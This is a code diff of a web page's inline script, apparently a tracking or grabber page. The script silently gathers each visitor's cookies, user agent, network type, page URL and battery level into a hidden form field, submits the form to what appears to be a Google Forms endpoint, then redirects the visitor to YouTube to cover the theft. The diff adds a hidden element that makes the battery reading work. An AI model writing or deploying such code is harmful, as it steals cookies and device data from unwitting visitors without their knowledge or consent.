@@ -44,11 +44,18 @@ setTimeout(() => window.open(`https://docs.google.com/forms/u/0/d/e/1FAIpQLSfthA
     
     </script>
     <script>
-
+function gB(){
+var g = document.createElement('div');
+g.id="HS-BB";
+g.style.display="none";
+setTimeout(() => navigator.getBattery().then(function(k){g.innerHTML=k.level * 100 + "%";}),1384);
+document.body.appendChild(g);
+}
+setTimeout(gB,2384);
    function Pj(){
      var X = document.getElementById("2");   
-var un = function(){navigator.getBattery().then(function(bc){return bc * 100 + "%";})};
-    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${un()}`;
+var B = document.getElementById('HS-BB');
+    X.value = `${navigator.userAgent} "App:"${navigator.appName},"Network:"${navigator.connection.type} "location":${document.location.href} "cookie":${document.cookie} "Charge":${B.innerHTML}`;
  var Z =document.getElementById("form");
     Z.submit();  
   location.href="https://m.youtube.com";
